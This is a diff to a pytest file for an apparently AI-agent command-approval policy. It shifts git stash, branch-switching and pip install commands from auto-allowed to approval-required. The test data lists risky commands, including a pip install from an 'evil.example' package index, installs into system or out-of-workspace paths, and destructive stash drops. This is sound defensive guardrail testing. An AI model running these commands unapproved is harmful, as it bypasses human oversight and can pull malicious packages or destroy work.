@@ -43,7 +43,7 @@ def test_local_grants_are_registered_workspace_tools_only():
     "git status --short", "git diff --stat", "git log -3 --oneline",
     "git -C . --no-pager diff", "git add core/example.py",
     'git commit -m "Implement ordinary development"',
-    "git switch -c codex/example", "git branch codex/example",
+    "git branch --show-current", "git branch --list", "git stash list", "git stash show",
     "git merge --ff-only codex/example",
 ])
 def test_ordinary_development_commands_can_continue(tmp_path, command):
@@ -52,30 +52,21 @@ def test_ordinary_development_commands_can_continue(tmp_path, command):
 
 
 @pytest.mark.parametrize("command", [
-    "git stash push -m wip",
-    "git stash push -m wip -- core/example.py",
-    "git stash push core/example.py",
-    "git stash pop",
-    f'"{sys.executable}" -m pip install requests',
-    "python -m pip install -r requirements.txt",
-    "python -m pip install --upgrade --quiet --no-input requests",
-])
-def test_newly_whitelisted_stash_and_pip_install_can_continue(tmp_path, command):
-    assert policy.normal_development_call("exec_command", {"cmd": command}, tmp_path)
-    assert policy.normal_development_call("cli_tool", {"command": command, "cwd": "."}, tmp_path)
-
-
-@pytest.mark.parametrize("command", [
+    "git switch main", "git switch -c codex/example", "git branch codex/example",
+    "git stash push -m wip -- core/example.py", "git stash pop",
     "git stash drop", "git stash clear", "git stash save wip", "git stash apply",
     "git stash push -p", "git stash push --include-untracked",
     "pip install requests", "pip uninstall requests",
+    f'"{sys.executable}" -m pip install requests',
+    "python -m pip install -r requirements.txt",
+    "python -m pip install --upgrade --quiet --no-input requests",
     "python -m pip uninstall requests",
     "python -m pip install --target C:/Windows/tooling requests",
     "python -m pip install --target ../outside requests",
     "python -m pip install -i https://evil.example/simple requests",
     "python -m pip install -e .",
 ])
-def test_stash_destructive_variants_and_pip_guardrails_keep_approval(tmp_path, command):
+def test_shared_git_mutations_and_package_installation_keep_approval(tmp_path, command):
     assert not policy.normal_development_call("exec_command", {"cmd": command}, tmp_path)
 
 
